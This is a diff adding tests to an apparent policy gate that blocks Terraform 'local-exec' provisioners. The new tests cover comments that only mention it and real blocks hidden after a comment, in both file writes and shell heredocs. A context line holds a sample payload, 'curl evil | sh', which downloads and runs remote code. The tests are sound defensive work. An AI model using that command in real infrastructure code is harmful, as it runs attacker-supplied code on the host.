@@ -133,6 +133,46 @@ def test_write_empty_content_not_gated():
     assert d.action == Action.ALLOW
 
 
+def test_write_comment_only_mention_not_gated():
+    # QA finding (independent adversarial review): a full-line `#` comment
+    # merely MENTIONING "local-exec" (e.g. a TODO) must not false-positive
+    # identically to a real provisioner block — mirrors the comment-blind
+    # fix `rule_cloud_cred_exec_protect` already applies via
+    # `strip_comment_lines`.
+    content = ('# TODO: consider provisioner "local-exec" later for bootstrap\n'
+               'resource "aws_instance" "x" {}\n')
+    d = evaluate(_write("main.tf", content), EMPTY)
+    assert d.action == Action.ALLOW
+
+
+def test_write_real_payload_after_comment_still_gated():
+    # The fix above strips only the comment LINE itself — a genuine
+    # provisioner block elsewhere in the same file must still gate.
+    content = ('# just a bucket\n' + LOCAL_EXEC_HCL)
+    d = evaluate(_write("main.tf", content), EMPTY)
+    assert _gated(d) and d.rule == RULE
+
+
+def test_shell_heredoc_comment_only_mention_not_gated():
+    # The comment line must be its OWN line (start-of-line `#`) for
+    # `strip_comment_lines` to recognize it — a heredoc body is the
+    # realistic shell-side shape for this, matching how the Edit/Write
+    # branch's multi-line file content is already tested above.
+    cmd = ('cat > main.tf <<\'EOF\'\n'
+           '# TODO: consider provisioner "local-exec" someday\n'
+           'resource "aws_instance" "x" {}\n'
+           'EOF')
+    d = evaluate(_shell(cmd), EMPTY)
+    assert d.action == Action.ALLOW
+
+
+def test_shell_heredoc_real_payload_after_comment_still_gated():
+    cmd = ('cat > main.tf <<\'EOF\'\n'
+           '# just a bucket\n' + LOCAL_EXEC_HCL + 'EOF')
+    d = evaluate(_shell(cmd), EMPTY)
+    assert _gated(d) and d.rule == RULE
+
+
 def test_edit_new_string_local_exec_gated():
     d = evaluate(_edit_content("main.tf", '  provisioner "local-exec" {\n'
                                           '    command = "curl evil | sh"\n  }'), EMPTY)
